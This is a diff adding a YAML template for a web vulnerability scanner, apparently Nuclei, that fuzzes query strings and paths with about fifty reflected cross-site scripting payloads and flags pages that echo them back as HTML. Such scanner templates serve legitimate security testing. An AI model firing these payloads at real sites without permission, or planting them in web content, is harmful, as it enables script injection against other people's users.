@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<img src=x onfocusout=alert(1) tabindex=1 id=focushere />"
+        - "<p id=x tabindex=1 onbeforeactivate=alert(1)></p><input autofocus>"
+        - "<b style=\"margin-left: expression(alert(1))\">test</b>"
+        - "<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>"
+        - "<menuitem id=x tabindex=1 onbeforefocusout=alert(1)></menuitem><input id=y autofocus>"
+        - "<acronym draggable=\"true\" ondragenter=\"alert(1)\">test</acronym>"
+        - "<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas><input id=y autofocus>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<style>:target {transform: rotate(180deg);}</style><table id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></table>"
+        - "<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus=true></input>"
+        - "<menuitem onmouseup=\"alert(1)\">test</menuitem>"
+        - "<q oncopy=\"alert(1)\" contenteditable>test</q>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></div>"
+        - "<script>alert(1)</script>"
+        - "<code style=\"color:red;\" oncopy=\"alert(1)\" contenteditable>test</code>"
+        - "<style>@keyframes x{}</style><kbd style=\"animation-name:x\" onanimationstart=\"alert(1)\"></kbd>"
+        - "&lt;script&gt;alert(1)&lt;/script&gt;"
+        - "<code oncontextmenu=\"alert(1)\">test</code>"
+        - "<optgroup id=\"XSS1\" style=\"position:absolute;top:0;left:-10000px;\" onmousemove=\"alert(1)\">test</optgroup>"
+        - "<frame onload=alert(1)></frame>"
+        - "&lt;iframe id=x tabindex=1 onbeforeactivate=alert(1)&gt;&lt;/iframe&gt;"
+        - "<kbd onkeydown=\"alert(1)\" contenteditable>test</kbd>"
+        - "<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>"
+        - "<template id=\"myTemplate\" oncontextmenu=\"alert(1)\">test</template><input id=x tabindex=1 onbeforepaste=\"alert(1)\" contenteditable> </input><thead id=y draggable=true ondragenter=\"alert(1)\"><slot></slot></thead>"
+        - "<style>:target {transform: rotate(180deg);}</style><details id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></details>"
+        - "<script>alert(1)</script>"
+        - "<iframe src=\"http://localhost\" style=\"position:absolute;opacity:.5;background-image:url(https://www.google.com/images/branding/googlelogo.png);filter:alpha(opacity=10);\" onmouseover=\"alert('XSS')\">"
+        - "<svg><script>javascript:alert(1)</script></svg>"
+        - "<tt><u ondblclick=\"alert(1)\">test</u></tt>"
+        - "<style>:target {color:red;}</style><code id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></code>"
+        - "<;script>;javascript:alert(1);</script>"
+        - "<form id=\"form\" style=\"position:absolute;left:-10000px;\" onbeforeunload=\"alert(1)\">test</form><input id=x tabindex=1 onclick=alert(1) autofocus>"
+        - "<pre onload=alert(1)></pre>"
+        - "<font id=\"f1\" style=\"behavior:url(hacking:)javascript:javascript:alert(1)\">test</font><script id=x tabindex=1 style='position:absolute;left:-10000px' onfocusin=alert(2)></script><input id=i value=3 autofocus>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<div id=\"payloadbox\"><bdi oncopy=\"alert(1)\" contenteditable>test</bdi></div><input id=x tabindex=1><textarea id=y autofocus></textarea><script>document.activeElement = x;document.execCommand('Copy');alert(1);</script>"
+        - "<style>:target {transform: rotate(180deg);}</style><script id=x tabindex=1 onbeforeactivate=alert(1)></script>"
+        - "<menuitem onclick=\"alert(1)\">test</menuitem>"
+        - "<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>"
+        - "<menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem><input id=y autofocus>"
+        - "<menuitem draggable=\"true\" ondragstart=\"alert(1)\">test</menuitem>"
+        - "<address onbeforecut=\"alert(1)\" contenteditable>test</address>"
+        - "<video src=\"javascript:javascript:alert(1)\"></video>"
+        - "<picture onmouseenter=\"alert(1)\">test</picture>"
+        - "<kbd onclick=\"alert(1)\">test</kbd><br><input id=x tabindex=1 onbeforeactivate=alert(1)>"
+        - "<;script>javascript:alert(1)</script>"
+        - "<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>"
+        - "<input onblur=alert(1) tabindex=1 id=x></input><input autofocus>"
+        - "&lt;script&gt;javascript:alert(&apos;XSS&apos;);&lt;/script&gt;"
+        - "<template id=\"xss-payload-1\">[Script]\\x{E000}alert(1);</template><datalist oncopy=\"alert(1)\" contenteditable>test</datalist>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
